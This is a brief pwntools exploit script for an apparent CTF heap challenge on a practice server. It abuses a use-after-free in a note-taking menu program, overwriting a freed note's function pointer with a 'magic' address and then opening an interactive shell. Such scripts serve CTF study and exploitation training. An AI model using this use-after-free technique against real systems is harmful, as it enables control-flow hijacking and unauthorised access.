from pwn import *

#sh=process("./timu")
sh=remote("node5.buuoj.cn",26262)

def alloc(size,content):
	sh.recvuntil(b"Your choice :")
	sh.sendline(b"1")
	sh.recvuntil(b"Note size :")
	sh.sendline(str(size))
	sh.recvuntil(b"Content :")
	sh.sendline(content)

def free(index):
	sh.recvuntil(b"Your choice :")
	sh.sendline(b"2")
	sh.recvuntil(b"Index :")
	sh.sendline(str(index))

def show(index):
	sh.recvuntil(b"Your choice :")
	sh.sendline(b"3")
	sh.recvuntil(b"Index :")
	sh.sendline(str(index))

magic=0x08048945
alloc(0x8,b"aaaa")
alloc(0x60,b"aaaa")
free(0)
free(1)
alloc(0x8,p32(magic))
show(0)

sh.interactive()
